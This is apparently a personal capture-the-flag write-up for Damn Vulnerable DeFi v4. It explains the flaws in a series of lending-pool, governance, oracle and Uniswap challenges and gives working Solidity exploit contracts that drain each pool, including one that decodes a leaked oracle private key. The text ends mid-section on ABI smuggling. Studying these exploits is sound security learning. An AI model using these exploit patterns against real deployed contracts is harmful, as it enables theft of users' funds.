# Damn Vulnerable DeFi v4
## Preface
Location: [https://www.damnvulnerabledefi.xyz](https://www.damnvulnerabledefi.xyz)

This is for my personal use to ensure that I understand what I'm doing. Some of the solution code was inspired, analyzed and rewritten, or partially copied from other solutions. While I attempted to do as much as possible on my own, I took peeks here and there when I got stuck.

Here are some sources that I've used while doing this CTF:

* https://medium.com/@opensiddhu993/
* https://medium.com/@mattaereal/damnvulnerabledefi-abi-smuggling-challenge-walkthrough-plus-infographic-7098855d49a


## 1. Unstoppable
```
There’s a tokenized vault with a million DVT tokens deposited. It’s offering flash loans for free, until the grace period ends.

To catch any bugs before going 100% permissionless, the developers decided to run a live beta in testnet. There’s a monitoring contract to check liveness of the flashloan feature.

Starting with 10 DVT tokens in balance, show that it’s possible to halt the vault. It must stop offering flash loans.
```

Denial of service (DoS) is a much broader category than other vulnerabilities this CTF explores. For example, rescuing funds can be seen as DoS. Specifically, we're looking for ways to prevent _others_ from correct execution of the contract: you can always find a way to screw up your own transaction. Looking at the `UnstoppableVault.flashLoan` function, we can see that it has three immediate conditions.

```solidity
    if (amount == 0) revert InvalidAmount(0); // fail early
    if (address(asset) != _token) revert UnsupportedCurrency(); // enforce ERC3156 requirement

    uint256 balanceBefore = totalAssets();
    if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement
```

The first two are direct checks on our inputs, so they're irrelevant. The third, however, affects the contract itself. If we can find a way to make `convertToShares(totalSupply) != balanceBefore`, it will prevent anyone from using `flashLoan`. The `balanceBefore` variable is calulated by calling `totalAssets`, defined as below.

```solidity
    function totalAssets() public view override nonReadReentrant returns (uint256) {
        return asset.balanceOf(address(this));
    }
```
This calculates the total assets by checking the balance of `DamnValuableToken` (DVT) assigned to the vault. You may notice that neither `totalSupply` nor `convertToShares` is defined in this class. `convertToShares` is actually defined in ERC4626 and `totalSupply` is defined in ERC20. If we peruse through OpenZeppelin's (OZ) "ERC20.sol", we can see that it's backed by an internal accounting variable that is only changed when `ERC20._update` is called.

```solidity
    function _update(address from, address to, uint256 value) internal virtual {
        if (from == address(0)) {
            // Overflow check required: The rest of the code assumes that totalSupply never overflows
            _totalSupply += value;
        } else {
            uint256 fromBalance = _balances[from];
            if (fromBalance < value) {
                revert ERC20InsufficientBalance(from, fromBalance, value);
            }
            unchecked {
                // Overflow not possible: value <= fromBalance <= totalSupply.
                _balances[from] = fromBalance - value;
            }
        }

        if (to == address(0)) {
            unchecked {
                // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.
                _totalSupply -= value;
            }
        } else {
            unchecked {
                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.
                _balances[to] += value;
            }
        }

        emit Transfer(from, to, value);
    }
```

Since `asset.balanceOf(address(this))` needs to be one-to-one with `convertToShares(totalSupply)`, then updating the DVT balance outside of the internal accounting will cause this requirement to fail.

The exploit is simply transfering some DVT from `player` to `vault`.
```solidity
    token.transfer(payable(address(vault)), 10e18);
```

## 2. Naive receiver
```
There’s a pool with 1000 WETH in balance offering flash loans. It has a fixed fee of 1 WETH. The pool supports meta-transactions by integrating with a permissionless forwarder contract.

A user deployed a sample contract with 10 WETH in balance. Looks like it can execute flash loans of WETH.

All funds are at risk! Rescue all WETH from the user and the pool, and deposit it into the designated recovery account.
```

This one's instantly a big step up in difficulty from challenge 1. Let's start with some background information. A flash loan allows contracts to take out a loan and pay it back within the _same_ function. If you don't pay it back, the lender will revert your transaction. The "meta-transactions" they're talking about is the `BasicForwarder` contract. I don't know why they don't just call it a relay, but that's basically all it does. The relay requires that the address at `Request.from` signed the request, so causing a mismatch there isn't a vector.

We also need to take into account a few other facts. We don't have any ETH in the `player` account, but `receiver` does. The `flashLoan` function allows you to call it for any `IERC3156FlashBorrower` and the `FlashLoanReceiver` contract at `receiver` doesn't check to see if it actually wanted the loan. The `NaiveReceiverPool` inherits from `Multicall`, exposing the `Multicall.multicall` function. This allows a single transaction to contain several calls to the same contract.

Alright, meat and potatoes. Note that `flashLoan` deposits the loan fee in `feeReceiver`'s account.

```solidity
    deposits[feeReceiver] += FIXED_FEE;
```

Also note that `withdraw` is using a function called `_msgSender` to determine which account to pull from.

```solidity
    function withdraw(uint256 amount, address payable receiver) external {
        // Reduce deposits
        deposits[_msgSender()] -= amount;
        totalDeposits -= amount;

        // Transfer ETH to designated receiver
        weth.transfer(receiver, amount);
    }
```

Because `withdraw` is dependent on the transaction's sender, it has special handling for messages from the forwarder to parse out the real address.

```solidity
    function _msgSender() internal view override returns (address) {
        if (msg.sender == trustedForwarder && msg.data.length >= 20) {
            return address(bytes20(msg.data[msg.data.length - 20:]));
        } else {
            return super._msgSender();
        }
    }
```

Going back a step, we see that `BasicForwarder.execute` packs the `BasicForwarder.Request`'s `data` and `from` fields into the `msg.data` it sends.

```solidity
        uint256 gasLeft;
        uint256 value = request.value; // in wei
        address target = request.target;

        bytes memory payload = abi.encodePacked(request.data, request.from); // **DANI: Payload built here**

        uint256 forwardGas = request.gas;
        assembly {
            success := call(forwardGas, target, value, add(payload, 0x20), mload(payload), 0, 0) // don't copy returndata
            gasLeft := gas()
        }
```

We control both `data` and `from`, but `from` is strictly constrained because we would need access to the private key to sign for someone else. `data` is a free variable, so maybe we could construct it in such a way that `_msgSender` returns the address of `feeReceiver`. (Un)fortunately, `_msgSender` takes this into account by always selecting the last 20 bytes which matches the `from` field instead. We're missing a piece of the puzzle: `Multicall`.


```solidity
    function multicall(bytes[] calldata data) external virtual returns (bytes[] memory results) {
        results = new bytes[](data.length);
        for (uint256 i = 0; i < data.length; i++) {
            results[i] = Address.functionDelegateCall(address(this), data[i]); // **DANI: Note `data` getting passed in!**
        }
        return results;
    }
```

`Multicall` uses OZ's `functionDelegateCall` which wraps `address.delegatecall`. This function keeps the `sender` and `value` fields the same but overwrites the transaction's `data` field. We can use this disjoint between `multicall` and `_msgSender` to withdraw from `feeReceiver`'s account!

Exploit time. We build a `Request` we send to `BasicForwarder.execute` that we want relayed to `NaiveReceiverPool.multicall`. The argument `bytes[] calldata data` we send will 11 total calls: 10 to `flashLoan` and 1 to `withdraw`. The `flashLoan` calls will use the `receiver`'s account so they have to pay the 1 WETH fee, thus depositing all their WETH into `feeReceiver`'s account. For the `withdraw` call, we'll append the `feeReceiver`'s address to the end like `BasicForwarder` would.

```solidity
    function test_naiveReceiver() public checkSolvedByPlayer {
        /**
         * 1. Create 10 packed calls to flashloan with the receiver to drain the accounts (abi.encodeCall)
         * 2. Make a final packed call to withdraw from deployer (abi.encodePacked)
         * 3. Encode all of that with a multicall encodeCall
         * 4. Create a Forwarder request with that calldata
         * 5. Pack and hash the request
         * 6. Pack the signature
         * 7. Send to forwarder
         */

        // 1.
        bytes[] memory packed_calls = new bytes[](11);

        for(uint256 i=0; i < 10; i++) {
            packed_calls[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 0, ""));
        }

        // 2.
        packed_calls[10] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_RECEIVER + WETH_IN_POOL, payable(recovery))), bytes32(uint256(uint160(deployer))));

        // 3.
        bytes memory top_level_call = abi.encodeCall(Multicall.multicall, packed_calls);

        // 4.
        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: player,
            target: address(pool),
            value: 0,
            gas: 30000000,
            nonce: forwarder.nonces(player),
            data: top_level_call,
            deadline: 1 days
        });

        bytes32 req_hash = keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(request)));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, req_hash);
        forwarder.execute(request, abi.encodePacked(r,s,v));
    }
```


## 3. Truster
```
More and more lending pools are offering flashloans. In this case, a new pool has launched that is offering flashloans of DVT tokens for free.

The pool holds 1 million DVT tokens. You have nothing.

To pass this challenge, rescue all funds in the pool executing a single transaction. Deposit the funds into the designated recovery account.
```

As we saw in challenge 1, there is a standardized way to interact with flash lenders, `IERC3156FlashBorrower`. This interface defines a strict way that the lender calls back to the borrower. In this challenge, `TrusterLenderPool` has ignored that interface and is doing it naively.


```solidity
    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
        external
        nonReentrant
        returns (bool)
    {
        uint256 balanceBefore = token.balanceOf(address(this));

        token.transfer(borrower, amount);
        target.functionCall(data);

        if (token.balanceOf(address(this)) < balanceBefore) {
            revert RepayFailed();
        }

        return true;
    }
```

The `flashLoan` function takes `borrower`, `target`, and `data` arguments that are of immediate interest. The `borrower` does not have to be the `msg.sender` nor the `target`. Which function to call and what arguments to call it with are also free variables.

The exploit is simple. Call `flashLoan` with the token as the `target` and encode `approve` as the function call. Because the assert statments in solution checker require it to be done in a single transaction, just create a contract to do the work and deploy it.

```solidity
contract Exploit {
    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    function beatemup(TrusterLenderPool pool, address recovery, DamnValuableToken token) external {
        pool.flashLoan(0, address(this), address(token), abi.encodeWithSignature("approve(address,uint256)", address(this), TOKENS_IN_POOL));
        token.transferFrom(address(pool), address(this), TOKENS_IN_POOL);
        token.transfer(recovery, TOKENS_IN_POOL);
    }

}
```


## 4. Side entrance
```
A surprisingly simple pool allows anyone to deposit ETH, and withdraw it at any point in time.

It has 1000 ETH in balance already, and is offering free flashloans using the deposited ETH to promote their system.

Yoy start with 1 ETH in balance. Pass the challenge by rescuing all ETH from the pool and depositing it in the designated recovery account.
```

The `SideEntranceLenderPool` is another flash loan pool with bad accounting. Take a look at the following functions, `flashLoan` and `deposit`.

```solidity
    function deposit() external payable {
        unchecked {
            balances[msg.sender] += msg.value;
        }
        emit Deposit(msg.sender, msg.value);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        if (address(this).balance < balanceBefore) {
            revert RepayFailed();
        }
    }
```

`flashLoan` determines whether you paid it back by comparing its _total_ account balance before and after. Meanwhile, it determines _your account's_ balance via an internal acccounting variable, `balances`. The exploit exists in the slack between the two. `deposit` is a `payable` function and uses `msg.value` directly. This means you have to pay in the basechain token, ETH. When you pay `deposit`, it adds it to the pool's balance while simultaneously adding to the accounting.

Here's the idea:
1. Take a flash loan for everything in the pool
2. In your `execute` function, deposit it all into your account
3. When `flashLoan` is returned to from your function, the balances will match
4. Withdraw everything from the pool

<br>

```solidity
contract Exploit {
    uint256 constant ETHER_IN_POOL = 1000e18;
    SideEntranceLenderPool pool;
    address recip;

    constructor(SideEntranceLenderPool _pool, address _recip) {
        pool  = _pool;
        recip = _recip;
    }

    receive() external payable{}

    function win() external {
        pool.flashLoan(ETHER_IN_POOL);
        pool.withdraw();
        payable(recip).transfer(address(this).balance);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }
}
```

## 5. The Rewarder
```
A contract is distributing rewards of Damn Valuable Tokens and WETH.

To claim rewards, users must prove they’re included in the chosen set of beneficiaries. Don’t worry about gas though. The contract has been optimized and allows claiming multiple tokens in the same transaction.

Alice has claimed her rewards already. You can claim yours too! But you’ve realized there’s a critical vulnerability in the contract.

Save as much funds as you can from the distributor. Transfer all recovered assets to the designated recovery account.
```

This challenge is going to be another exercise in managing complexity. Merkle trees, bit operations, deserialization from JSON, and a few red herrings. Let's start with our fundamentals. The goal is to ultimately transfer tokens out, so we need a function that transfers to us and a way to create some sort of accounting error.

```solidity
    function createDistribution(IERC20 token, bytes32 newRoot, uint256 amount) external {
        if (amount == 0) revert NotEnoughTokensToDistribute();
        if (newRoot == bytes32(0)) revert InvalidRoot();
        if (distributions[token].remaining != 0) revert StillDistributing();

        distributions[token].remaining = amount;

        uint256 batchNumber = distributions[token].nextBatchNumber;
        distributions[token].roots[batchNumber] = newRoot;
        distributions[token].nextBatchNumber++;

        SafeTransferLib.safeTransferFrom(address(token), msg.sender, address(this), amount);

        emit NewDistribution(token, batchNumber, newRoot, amount);
    }
```

Here's the first function with a transfer, `createDistribution`. It's `external` so we can call it. However, it transfers _from_ us, not _to_ us. And unless we can get someone else to call it, it's not useful for accounting either.

```solidity
    function clean(IERC20[] calldata tokens) external {
        for (uint256 i = 0; i < tokens.length; i++) {
            IERC20 token = tokens[i];
            if (distributions[token].remaining == 0) {
                token.transfer(owner, token.balanceOf(address(this)));
            }
        }
    }
```

`clean` is also `external`, but transfers funds to `owner`. `owner` is immutable and set to the creator of the contract. Not useful.

```solidity
function claimRewards(Claim[] memory inputClaims, IERC20[] memory inputTokens) external {
    ...
    inputTokens[inputClaim.tokenIndex].transfer(msg.sender, inputClaim.amount);
}
```

The `claimRewards` `external` function is big and difficult to initially understand. However, we can see that the last line transfers tokens from the contract to `msg.sender`. Bingo. Now let's do some taint analysis. We need to figure which variables we control, how they affect the internal state, and what constraints exist on them. `claimRewards` takes in a list of `Claim`s and a list of `IERC20` tokens.

A `Claim` is defined as follows:

```solidity
    struct Claim {
        uint256 batchNumber;
        uint256 amount;
        uint256 tokenIndex;
        bytes32[] proof;
    }
```

Further down the function, we can see some input validation on each `Claim`'s fields.

```solidity
    bytes32 leaf = keccak256(abi.encodePacked(msg.sender, inputClaim.amount));
    bytes32 root = distributions[token].roots[inputClaim.batchNumber];

    if (!MerkleProof.verify(inputClaim.proof, root, leaf)) revert InvalidProof();
```

So `proof` is some opaque Merkle tree path, the inputted `leaf` is built from our address, `msg.sender`, and the amount we're claiming. The `root` is defined when the distribution is created, so we don't control that. Manipulating `batchNumber` will only make things worse because either that `root` won't exist or will be incorrect. `tokenIndex` is the only remaining field, and it simply tells the function which index in the user-supplied `inputTokens` that claim corresponds to. The selected token is stored in `token`, which again, is required to be correct for the proof.

Okay, but maybe we can create an accounting error using a correct `Claim`. How does it stop us from claiming a token twice?

```solidity
    if (token != inputTokens[inputClaim.tokenIndex]) {
        if (address(token) != address(0)) {
            if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed(); // **DANI: This seems to stop double claiming?**
        }

        token = inputTokens[inputClaim.tokenIndex];
        bitsSet = 1 << bitPosition; // set bit at given position
        amount = inputClaim.amount;
    } else {
        bitsSet = bitsSet | 1 << bitPosition;
        amount += inputClaim.amount;
    }
```

This is where some funky bit manipulation comes in. Ignore it for now. The immediate line of interest reverts with `AlreadyClaimed()` if `_setClaimed` returns `false`. This is how they must be trying to stop double claiming. Let's assume for a moment that `_setClaimed` is entirely correct. `_setClaimed` is only checked if the current `Claim` is using a different token than the previous. It seems like this is intended functionality because there would be no reason to not check every iteration. Maybe one beneficiary could have multiple `Claim`s on the same `token` and `batchNumber`. However, this only stops us from calling the function again or interleaving `Claim`s from the same batch. **It does not check if a specific Claim has been used before**.

This exploit is quite long due to all the setup with deserialization and building `Claim`s. Here's the rundown:
1. Build our legitimate `Claim`s for each token, `weth` and `dvt`
2. Determine how many of each token we need to `Claim` to drain the pool, `wethAmount` and `dvtAmount` respectively
3. Create an array with `wethAmount` contiguous copies of the WETH `Claim` and `dvtAmount` contiguous copies of the DVT `Claim`
4. Execute `claimRewards` with that array


## 6. Selfie
```
A new lending pool has launched! It’s now offering flash loans of DVT tokens. It even includes a fancy governance mechanism to control it.

What could go wrong, right ?

You start with no DVT tokens in balance, and the pool has 1.5 million at risk.

Rescue all funds from the pool and deposit them into the designated recovery account.
```

Alright, this one's just kinda funny. The governance mechanism, which I'm going to call the DAO, is controlled by a voting token, `DamnValuableVotes`. If the `msg.sender` has over half the supply of votes, it will execute an action on a `target` other than itself. On the `SelfiePool` that we're trying to rescue funds from, there's a spicy function called `emergencyExit`.

```solidity
    function emergencyExit(address receiver) external onlyGovernance {
        uint256 amount = token.balanceOf(address(this));
        token.transfer(receiver, amount);

        emit EmergencyExit(receiver, amount);
    }
```

This looks like a great mechanism for recovering the tokens, but it can only be called by the DAO. Now, I promised this would be funny: the lending pool's token is the same `DamnValuableVotes` that the DAO uses.

Here's the exploit:
1. `flashLoan` ourselves over half the vote
2. Use `queueAction` on the DAO with the call to `emergencyExit` sending everything to the `recovery` account
3. Give the tokens back to the pool
4. Wait 3 days for the action to be runnable
5. Run the action

<br/>

```solidity
contract Exploit is IERC3156FlashBorrower {
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;
    SimpleGovernance immutable governance;
    SelfiePool immutable pool;
    address immutable recovery;
    uint256 actionId;

    constructor(SimpleGovernance _governance, SelfiePool _pool, address _recovery) {
        governance = _governance;
        pool       = _pool;
        recovery   = _recovery;
    }

    function setup(address token) public {
        pool.flashLoan(IERC3156FlashBorrower(this), token, TOKENS_IN_POOL, "");
    }

    function win() public {
        governance.executeAction(actionId);
    }

    function onFlashLoan(address, address token, uint256, uint256, bytes calldata) public returns (bytes32) {
        DamnValuableVotes(token).delegate(address(this));
        actionId = governance.queueAction(address(pool), 0, abi.encodeCall(SelfiePool.emergencyExit, (recovery)));
        DamnValuableVotes(token).approve(address(pool), TOKENS_IN_POOL);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
```

## 7. Compromised
```
While poking around a web service of one of the most popular DeFi projects in the space, you get a strange response from the server. Here’s a snippet:


HTTP/2 200 OK
content-type: text/html
content-language: en
vary: Accept-Encoding
server: cloudflare

4d 48 67 33 5a 44 45 31 59 6d 4a 68 4d 6a 5a 6a 4e 54 49 7a 4e 6a 67 7a 59 6d 5a 6a 4d 32 52 6a 4e 32 4e 6b 59 7a 56 6b 4d 57 49 34 59 54 49 33 4e 44 51 30 4e 44 63 31 4f 54 64 6a 5a 6a 52 6b 59 54 45 33 4d 44 56 6a 5a 6a 5a 6a 4f 54 6b 7a 4d 44 59 7a 4e 7a 51 30

4d 48 67 32 4f 47 4a 6b 4d 44 49 77 59 57 51 78 4f 44 5a 69 4e 6a 51 33 59 54 59 35 4d 57 4d 32 59 54 56 6a 4d 47 4d 78 4e 54 49 35 5a 6a 49 78 5a 57 4e 6b 4d 44 6c 6b 59 32 4d 30 4e 54 49 30 4d 54 51 77 4d 6d 46 6a 4e 6a 42 69 59 54 4d 33 4e 32 4d 30 4d 54 55 35


A related on-chain exchange is selling (absurdly overpriced) collectibles called “DVNFT”, now at 999 ETH each.

This price is fetched from an on-chain oracle, based on 3 trusted reporters: 0x188...088, 0xA41...9D8 and 0xab3...a40.

Starting with just 0.1 ETH in balance, pass the challenge by rescuing all ETH available in the exchange. Then deposit the funds into the designated recovery account.
```

Woah, mysterious. Probably just the wind. Let's ignore it for now because we don't have the context to why those blobs are useful. There's a very obvious path that we should look at first. If we can manipulate the price of the NFTs, we can buy low and sell high. Hopefully, "low" is basically zero, and "high" is the entire pool. Alright, so how do these oracles work, and how is the price computed from that?

Here's a little snip from the `TrustfulOracle` contract:

```solidity
    function postPrice(string calldata symbol, uint256 newPrice) external onlyRole(TRUSTED_SOURCE_ROLE) {
        _setPrice(msg.sender, symbol, newPrice);
    }

    function getMedianPrice(string calldata symbol) external view returns (uint256) {
        return _computeMedianPrice(symbol);
    }

    function _setPrice(address source, string memory symbol, uint256 newPrice) private {
        uint256 oldPrice = _pricesBySource[source][symbol];
        _pricesBySource[source][symbol] = newPrice;
        emit UpdatedPrice(source, symbol, oldPrice, newPrice);
    }

    function _computeMedianPrice(string memory symbol) private view returns (uint256) {
        uint256[] memory prices = getAllPricesForSymbol(symbol);
        LibSort.insertionSort(prices);
        if (prices.length % 2 == 0) {
            uint256 leftPrice = prices[(prices.length / 2) - 1];
            uint256 rightPrice = prices[prices.length / 2];
            return (leftPrice + rightPrice) / 2;
        } else {
            return prices[prices.length / 2];
        }
    }
```

Each oracle is simply an externally owned account that is allowed to report a price to the `TrustfulOracle`. The `TrustfulOracle` computes the price it buys and sells for based off of the median of the three oracles. The median is actually a decent choice here. The median of a set is the just middle number when sorted. Imagine if they used averages and one oracle was malicious or compromised. The prices could look like `(1.5 eth, 1.3 eth, 9999999 eth)`. The average would be `3,333,335.8 eth`, but the median would only be `1.5 eth`. To abitrarily control the median, you would need to control over half the oracles.

Wait.

What were those two weird blobs up there?

```bash
┌──(samson)─[170]─[17:06:32]─[0:00:00.005972]─[kali@DESKTOP-0Q6Q7UG]─[/home/kali]
└─$ blob_a = Bytes(0x4d4867335a444531596d4a684d6a5a6a4e54497a4e6a677a596d5a6a4d32526a4e324e6b597a566b4d574934595449334e4451304e4463314f54646a5a6a526b595445334d44566a5a6a5a6a4f546b7a4d44597a4e7a5130)

┌──(samson)─[171]─[16:22:19]─[0:00:00.001400]─[kali@DESKTOP-0Q6Q7UG]─[/home/kali]
└─$ blob_a
<Bytes: b'MHg3ZDE1YmJhMjZjNTIzNjgzYmZjM2RjN2NkYzVkMWI4YTI3NDQ0NDc1OTdjZjRkYTE3MDVjZjZjOTkzMDYzNzQ0', byteorder='big'>

┌──(samson)─[172]─[16:22:21]─[0:00:00.004340]─[kali@DESKTOP-0Q6Q7UG]─[/home/kali]
└─$ blob_a = EncodingScheme.BASE64.decode(a)

┌──(samson)─[173]─[16:22:30]─[0:00:00.000655]─[kali@DESKTOP-0Q6Q7UG]─[/home/kali]
└─$ blob_a
<Bytes: b'0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159', byteorder='big'>
```

Um okay, looks like it could be a 256-bit integer? Let's pop it into ECDSA and run Ethereum's address scheme on it.

```bash
┌──(samson)─[174]─[16:22:31]─[0:00:00.005360]─[kali@DESKTOP-0Q6Q7UG]─[/home/kali]
└─$ ec = ECDSA(secp256k1.G, d=0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159)

┌──(samson)─[175]─[16:23:15]─[0:00:00.048775]─[kali@DESKTOP-0Q6Q7UG]─[/home/kali]
└─$ keccak256 = Keccak(r=1088, c=512, digest_bit_size=256)

┌──(samson)─[176]─[16:23:28]─[0:00:00.000969]─[kali@DESKTOP-0Q6Q7UG]─[/home/kali]
└─$ keccak256.hash(ec.Q.serialize_uncompressed()[1:])[-20:].hex()
<Bytes: b'a417d473c40a4d42bad35f147c21eea7973539d8', byteorder='big'>
```

Looks familiar... Let's check the oracle's addresses.

```solidity
    address[] sources = [
        0x188Ea627E3531Db590e6f1D71ED83628d1933088
        0xA417D473c40a4d42BAd35f147c21eEa7973539D8, // (͠≖ ͜ʖ͠≖)👌
        0xab3600bF153A316dE44827e2473056d56B774a40
    ];
```

Oh! It's an oracle's hex-encoded, BASE64-encoded, ASCII-encoded, hex-encoded private key! We have 2/3 of the oracles!

Here's the exploit:
1. Make both compromised oracles set the price to 0
2. Buy an NFT
3. Set both prices to the exchange's entire balance
4. Sell the NFT

<br/>

```solidity
    function test_compromised() public checkSolved {
        Exploit exploit = new Exploit{value: PLAYER_INITIAL_ETH_BALANCE}(exchange, nft, recovery);

        for (uint i=0; i < 2; i++) {
            vm.startPrank(sources[i]);
            oracle.postPrice("DVNFT", 0);
            vm.stopPrank();
        }

        exploit.buy();


        for (uint i=0; i < 2; i++) {
            vm.startPrank(sources[i]);
            oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
            vm.stopPrank();
        }

        exploit.sell();
    }
```


## 8. Puppet
```
There’s a lending pool where users can borrow Damn Valuable Tokens (DVTs). To do so, they first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.

There’s a DVT market opened in an old Uniswap v1 exchange, currently with 10 ETH and 10 DVT in liquidity.

Pass the challenge by saving all tokens from the lending pool, then depositing them into the designated recovery account. You start with 25 ETH and 1000 DVTs in balance.
```

First, we gotta talk about Uniswap. The general idea is that it's an exchange for ERC20 tokens; you can swap one token for another. However, its pricing is dynamically computed based on supply and demand. In this challenge, it's just swapping ETH for DVT, so nothing too crazy. The `PuppetPool` uses this exchange as a price oracle to determine how much you have to deposit in ETH to borrow DVT.

```solidity
    function _computeOraclePrice() private view returns (uint256) {
        // calculates the price of the token in wei according to Uniswap pair
        return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
    }
```

Interesting! If we could drain Uniswap's balance, we could take all of the DVT from `PuppetPool` for free. Let's see how the challenge set up our accounts.

```solidity
    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 10e18;
    uint256 constant UNISWAP_INITIAL_ETH_RESERVE = 10e18;

    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 25e18;

    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;
```

Well, this is awkward. We have 100x more DVT and 2.5x more ETH than Uniswap. The exploit kinda just falls out from here:
1. Sell as much DVT to Uniswap as possible to drive down the price
2. Use our initial ETH and our newly acquired ETH to borrow everything from the pool

<br/>

✨ _We do a little market manipulation_ ✨

```solidity
contract Exploit {
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;

    constructor() payable {}

    function win(DamnValuableToken token, PuppetPool lendingPool, IUniswapV1Exchange exchange, address recovery) public {
        // 1. Sell DVT to Uniswap until it runs out of ETH
        uint256 amount = token.balanceOf(address(this));
        token.approve(address(exchange), amount);
        exchange.tokenToEthTransferInput(amount, 1, block.timestamp, address(this));

        // 2. Borrow all DVT from PuppetPool (cost should be 0 or near it)
        lendingPool.borrow{value: address(this).balance}(POOL_INITIAL_TOKEN_BALANCE, recovery);
    }

    receive() external payable {}
}
```

## 9. Puppetv2
```
The developers of the previous pool seem to have learned the lesson. And released a new version.

Now they’re using a Uniswap v2 exchange as a price oracle, along with the recommended utility libraries. Shouldn’t that be enough?

You start with 20 ETH and 10000 DVT tokens in balance. The pool has a million DVT tokens in balance at risk!

Save all funds from the pool, depositing them into the designated recovery account.
```

I initially tried to get fancy here, but it didn't work out (i.e. I didn't understand the function calls). It's the same problem, but now with UniswapV2. The hardest part is finding any good documentation on how to actually call the functions.

This time there are two (2) tokens involved and still the ability to swap for ETH. For each token registered with the exchange, there's a `UniswapV2Pair` between it and every other token. The `UniswapV2Router` can be given a `path` of tokens it should swap for, and it will iteratively swap out tokens until reaching the end using these pairs. For example, DVT -> DAI -> WETH would swap DVT for DAI, and then DAI for WETH. This can be done via `UniswapV2Router.swapTokensForExactTokens`, but it doesn't seem to actually transfer the tokens to you. I think maybe it just keeps it in accounting?

The function `UniswapV2Router.swapExactTokensForETH` is the same idea but the last token has to be WETH. The big difference is that it unwraps the WETH and sends you ETH. 

Alright, we've fucked around, let's find out. The exploit is as follows:
1. Approve the `UniswapV2Router` for all your DVT
2. Use the `UniswapV2Router` to swap your DVT for ETH
3. Borrow everything from the `PuppetV2Pool`

<br/>

```
    function test_puppetV2() public checkSolvedByPlayer {
        address[] memory path;
        path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);

        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
        uniswapV2Router.swapExactTokensForETH(PLAYER_INITIAL_TOKEN_BALANCE, UNISWAP_INITIAL_WETH_RESERVE * 99/100, path, player, block.timestamp);

        weth.deposit{value: player.balance-(0.1 ether)}();
        weth.approve(address(lendingPool), weth.balanceOf(player));
        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
    }
```


## 15. ABI Smuggling
```
There’s a permissioned vault with 1 million DVT tokens deposited. The vault allows withdrawing funds periodically, as well as taking all funds out in case of emergencies.

The contract has an embedded generic authorization scheme, only allowing known accounts to execute specific actions.

The dev team has received a responsible disclosure saying all funds can be stolen.

Rescue all funds from the vault, transferring them to the designated recovery account.
```

Let's start with the big picture. `SelfAuthorizedVault` inherits from `AuthorizedExecutor`. `AuthorizedExecutor` has a one-time setup called `setPermissions` that decides which `executor` can call what function (by `selector`) on which `target`. `SelfAuthorizedVault` has a guard on both the `withdraw` and `sweepFunds` that reverts transactions if the vault isn't `msg.sender`.

```solidity
    modifier onlyThis() {
        if (msg.sender != address(this)) {
            revert CallerNotAllowed();
        }
        _;
    }

    function withdraw(address token, address recipient, uint256 amount) external onlyThis {...}

    function sweepFunds(address receiver, IERC20 token) external onlyThis {...}
```

Simply put, the `onlyThis` looks pretty ironclad. The only way we're calling those functions is from `address(this)`. This is intended because using `AuthorizedExecutor.execute` will call it on our behalf, if we have the permission. In the challenge `setUp` function, we can see that `player` is given permissions to call the function with the selector `hex"d9caed12"`.

```solidity
    bytes32 playerPermission = vault.getActionId(hex"d9caed12", player, address(vault));
```

This corresponds to `withdraw`, which only lets us withdraw 1 ether every 15 days. Obviously, this is too slow, and we'll need to call `sweepFunds`. Let's take a look at `execute` and see if we can bypass the permission check.

```solidity
    function execute(address target, bytes calldata actionData) external nonReentrant returns (bytes memory) {
        // Read the 4-bytes selector at the beginning of `actionData`
        bytes4 selector;
        uint256 calldataOffset = 4 + 32 * 3; // calldata position where `actionData` begins
        assembly {
            selector := calldataload(calldataOffset)
        }

        if (!permissions[getActionId(selector, msg.sender, target)]) {
            revert NotAllowed();
        }

        _beforeFunctionCall(target, actionData);

        return target.functionCall(actionData);
    }

    function getActionId(bytes4 selector, address executor, address target) public pure returns (bytes32) {
        return keccak256(abi.encodePacked(selector, executor, target));
    }
```

Immediately, something is weird. It's calculating some offset into its own raw calldata and ripping out `selector`. Since `selector` is being used to determine which functions we can call, it must be legitimately where the function selector exists in memory. What if we could construct calldata for `execute` that would have `withdraw` at `calldataOffset` but cause it to call `sweepFunds` instead?

We'll need to dive deep into [how Ethereum calls functions](https://docs.soliditylang.org/en/latest/abi-spec.html) at a low-level to solve this one. Each function of a contract has a [4-byte selector](https://docs.soliditylang.org/en/latest/abi-spec.html#function-selector) that's calculated by hashing the function signature with Keccak256 and taking the first four bytes. All spaces, argument names, and data location specifiers are removed. The return type is not included and contract types are [converted](https://docs.soliditylang.org/en/latest/abi-spec.html#function-selector) to `address`.

```bash
